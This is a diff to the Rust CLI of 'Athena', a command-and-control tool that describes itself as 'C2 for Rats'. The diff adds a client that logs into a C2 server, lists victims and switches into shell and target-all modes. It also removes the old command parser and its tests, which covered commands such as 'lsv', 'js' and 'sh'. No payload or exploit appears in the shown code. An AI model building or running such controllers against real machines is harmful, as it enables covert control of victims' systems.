@@ -14,30 +14,22 @@
  * You should have received a copy of the GNU Affero General Public License
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
-use serde::{Deserialize, Serialize};
+use std::io::{BufWriter, Write};
+
+use libathena::{payload::attack, AthenaClient, AthenaClientBuilder, AthenaResult, Client};
+
+pub mod commands;
+pub mod errors;
+pub mod handlers;
+pub mod options;
+
+const DEFAULT_PROMPT: &str = "(athena)";
+const SHELL_PROMPT: &str = "(shell)";
+const TARGET_ALL: &str = "(all)";
+
+pub const VERSION: &str = env!("CARGO_PKG_VERSION");
 
 use errors::*;
-
-pub mod options {
-    use clap::*;
-
-    /// Athena command and control CLI tool
-    #[derive(Clap, Clone, Debug)]
-    #[clap(
-        name = "anthena-cli",
-        author = "Aravinth Manivannan <realaravinth@batsense.net>",
-        version = "0.1.0"
-    )]
-    pub struct Options {
-        /// Password to login to C2 server
-        #[clap(short, long)]
-        pub password: String,
-
-        /// C2 server URL
-        #[clap(short, long)]
-        pub c2: String,
-    }
-}
 
 #[derive(Debug, PartialEq, Clone)]
 pub enum Mode {
@@ -46,121 +38,65 @@ pub enum Mode {
     Shell,
 }
 
-#[derive(Clone, Debug, Serialize, Deserialize, PartialEq)]
-pub enum Commands {
-    ListVictims,
-    SelectVictim,
-    MultipleVictims,
-    JavaScript,
-    Shell,
-    Help,
-    Exit,
+pub struct State<W: Write> {
+    pub write: BufWriter<W>,
+    pub mode: Mode,
+    pub client: AthenaClient,
+    pub victims: Vec<attack::Victim>,
 }
 
-macro_rules! derive_parse {
-    ($item:expr, $cmd:expr) => {
-        if $cmd == $item.get_val() {
-            return Ok($item);
-        };
-    };
-}
+impl<W: Write> State<W> {
+    pub async fn new(write: W, options: &options::Options) -> AthenaResult<Self> {
+        let write = BufWriter::new(write);
+        let mode = Mode::Default;
 
-macro_rules! set_mode {
-    ($self:expr, $option:expr, $mode:expr, $val:expr) => {
-        if *$self == $option {
-            return *$val = $mode;
-        };
-    };
-}
+        let client = AthenaClientBuilder::default()
+            .client(Client::builder())?
+            .password(options.password.clone())
+            .host(options.c2.clone())
+            .build()?;
 
-impl Commands {
-    pub fn get_val(&self) -> &'static str {
-        match self {
-            Self::ListVictims => "lsv",
-            Self::SelectVictim => "select",
-            Self::MultipleVictims => "multi",
-            Self::JavaScript => "js",
-            Self::Shell => "sh",
-            Self::Help => "help",
-            Self::Exit => "exit",
-        }
+        let victims = client.attack_list_victims().await?;
+
+        Ok(Self {
+            mode,
+            write,
+            client,
+            victims,
+        })
     }
 
-    pub fn set_mode(&self, mode: &mut Mode) {
-        set_mode!(self, Self::Shell, Mode::Shell, mode);
-        set_mode!(self, Self::MultipleVictims, Mode::TargetAll, mode);
-        if *mode != Mode::Default {
-            set_mode!(self, Self::Exit, Mode::Default, mode);
-        }
+    pub async fn refresh_victims(&mut self) -> AthenaResult<()> {
+        self.victims = self.client.attack_list_victims().await?;
+        Ok(())
     }
 
-    pub fn parse(cmd: &str) -> CliResult<Self> {
-        let cmd = cmd.trim();
-
-        derive_parse!(Self::ListVictims, cmd);
-        derive_parse!(Self::SelectVictim, cmd);
-        derive_parse!(Self::MultipleVictims, cmd);
-        derive_parse!(Self::JavaScript, cmd);
-        derive_parse!(Self::Shell, cmd);
-        derive_parse!(Self::Help, cmd);
-        derive_parse!(Self::Exit, cmd);
-
-        Err(CliErrors::CommandNotFound)
-    }
-}
-
-pub mod errors {
-    use derive_more::{Display, Error};
-
-    #[derive(Debug, Clone, PartialEq, Error, Display)]
-    pub enum CliErrors {
-        #[display(fmt = "Command not found")]
-        CommandNotFound,
-    }
-}
-
-pub type CliResult<T> = Result<T, CliErrors>;
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    macro_rules! get_val_tests {
-        ($enum:expr, $val:expr) => {
-            assert_eq!($enum.get_val(), $val);
-            assert_eq!(Commands::parse($val).unwrap(), $enum);
-        };
+    pub fn welcome(&mut self) -> CliResult<()> {
+        writeln!(
+            self.write,
+            r#"Athena {} - C2 for Rats
+Aravinth Mavnivannan<realaravinth@batsense.net>
+Be nice."#,
+            VERSION,
+        )?;
+        Ok(())
     }
 
-    macro_rules! mode_command_conv {
-        ($cmd:expr, $mode:expr, $expected_mode:expr) => {
-            $cmd.set_mode(&mut $mode);
-            assert_eq!($mode, $expected_mode);
-        };
+    pub fn default_prompt(&mut self) -> CliResult<()> {
+        write!(self.write, "{} => ", DEFAULT_PROMPT)?;
+        self.write.flush()?;
+        Ok(())
     }
 
-    #[test]
-    fn commands_work() {
-        get_val_tests!(Commands::ListVictims, "lsv");
-        get_val_tests!(Commands::SelectVictim, "select");
-        get_val_tests!(Commands::MultipleVictims, "multi");
-        get_val_tests!(Commands::JavaScript, "js");
-        get_val_tests!(Commands::Shell, "sh");
-        get_val_tests!(Commands::Help, "help");
-        get_val_tests!(Commands::Exit, "exit");
-
-        assert_eq!(
-            Commands::parse("commanddoesntexist").err().unwrap(),
-            CliErrors::CommandNotFound
-        );
+    pub fn shell_prompt(&mut self) -> CliResult<()> {
+        write!(self.write, "{}{}", DEFAULT_PROMPT, SHELL_PROMPT)?;
+        self.write.flush()?;
+        Ok(())
     }
 
-    #[test]
-    fn set_mode_works() {
-        let mut mode = Mode::Default;
-        mode_command_conv!(Commands::MultipleVictims, mode, Mode::TargetAll);
-        mode_command_conv!(Commands::Shell, mode, Mode::Shell);
-        mode_command_conv!(Commands::Exit, mode, Mode::Default);
-        mode_command_conv!(Commands::Exit, mode, Mode::Default);
+    pub fn targetall_prompt(&mut self) -> CliResult<()> {
+        write!(self.write, "{}{}", DEFAULT_PROMPT, TARGET_ALL)?;
+        self.write.flush()?;
+        Ok(())
     }
 }
